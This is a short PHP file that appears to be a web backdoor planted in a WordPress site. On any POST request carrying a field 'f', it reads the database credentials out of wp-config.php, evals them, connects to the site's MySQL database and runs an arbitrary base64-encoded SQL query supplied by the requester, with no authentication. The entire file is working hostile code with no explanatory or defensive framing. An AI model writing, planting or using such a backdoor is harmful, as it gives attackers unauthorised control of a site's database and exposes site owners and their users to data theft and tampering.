<?php
if ($_POST["f"]){
    $wpcf = 'wp-config.php';
    $fh = @fopen($wpcf, 'r');
    if ($fh) {
        while (!feof($fh)) {
            $data[] = fgets($fh);
        }
        fclose($fh);
        foreach ($data as $line) {
            if (preg_match('/define.*(DB_USER|DB_HOST|DB_PASSWORD|DB_NAME)/', $line)) {
                $conf[] = $line;
            }
        }
        if (@count($conf) < 4) {
            print('num');
            exit;
        }
        $set = implode($conf);
        eval($set);
        $conn = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
        if ($conn->connect_error) {
            print('null');
            exit;
        }
        $q = base64_decode($_POST["f"]);
        $r = $conn->query($q);
        $conn->close();
        print($r ? 'true' : 'false');
    }
}
?>

